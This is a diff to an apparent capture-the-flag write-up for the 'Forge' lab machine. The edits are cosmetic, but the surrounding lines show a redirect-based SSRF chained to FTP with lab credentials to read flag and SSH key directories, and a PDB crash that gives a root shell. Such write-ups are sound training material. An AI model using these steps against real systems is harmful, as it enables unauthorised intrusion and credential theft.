@@ -80,7 +80,7 @@ HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
 ```
 
 ```bash
-python3 ./ssrf_r.py 8000 http://admin.Forge.htb
+python3 ./ssrf_r.py 8000 http://admin.forge.htb
 ```
 
 Submit our server's URL through the upload form -- the server follows the redirect to `admin.forge.htb` and we can read the response through the uploads endpoint.
@@ -100,7 +100,7 @@ Chaining the SSRF with FTP access:
 
 ```bash
 python3 ./ssrf_r.py 8000 \
-  'http://admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@10.129.106.197:21'
+  'http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@10.129.106.197:21'
 ```
 
 ![FTP directory listing showing user flag](/images/forge/ftp-user-flag.png)
@@ -109,7 +109,7 @@ The FTP root is the user's home directory. Checking for SSH keys:
 
 ```bash
 python3 ./ssrf_r.py 8000 \
-  'http://admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@10.129.106.197:21/.ssh/'
+  'http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@10.129.106.197:21/.ssh/'
 ```
 
 ![SSH directory contents](/images/forge/ssh-directory.png)
@@ -175,12 +175,12 @@ The exploit:
 3. Send a non-integer input (e.g., `a`) to trigger `ValueError`
 4. The script crashes into PDB as root
 
-```
+{{< terminal title="root@forge" >}}
 (Pdb) import os
 (Pdb) os.system("sh")
 # whoami
 root
-```
+{{< /terminal >}}
 
 ---
 
